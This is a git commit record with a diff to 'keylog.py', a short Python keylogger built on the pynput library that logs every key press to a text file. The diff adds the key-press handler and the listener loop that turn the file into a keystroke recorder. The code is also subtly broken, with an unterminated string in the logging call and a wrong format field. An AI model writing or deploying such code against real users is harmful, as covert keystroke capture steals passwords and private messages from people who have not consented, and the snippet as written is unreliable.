f25297923474335e28b8192742fc9c2aa57dadc8
Stephen Harris <trackmastersteve@users.noreply.github.com>
2018-10-09 17:55:08 -0700

    Update keylog.py

--- keylog.py
+++ keylog.py
@@ -1,11 +1,15 @@
-#
-#
 # keylogger.py
-
-from pynput.keyboard import key, listener
+from pynput.keyboard import Key, Listener
 import logging
 
 log_dir = ""
 
-logging.basicConfig(filename=(log_dir) + "key_log.txt), level=logging.DEBUG, format='%(asctime)s: %(messages)s:')
+logging.basicConfig(filename=(log_dir) + "keylog.txt), level=logging.DEBUG, format='%(asctime)s: %(messages)s:')
 
+def on_press(key):
+    logging.info(str(key))
+    #if key == Key.esc:
+        #return False # Stop listener
+    
+with Listener(on_press=on_press) as listener:
+    listener.join()
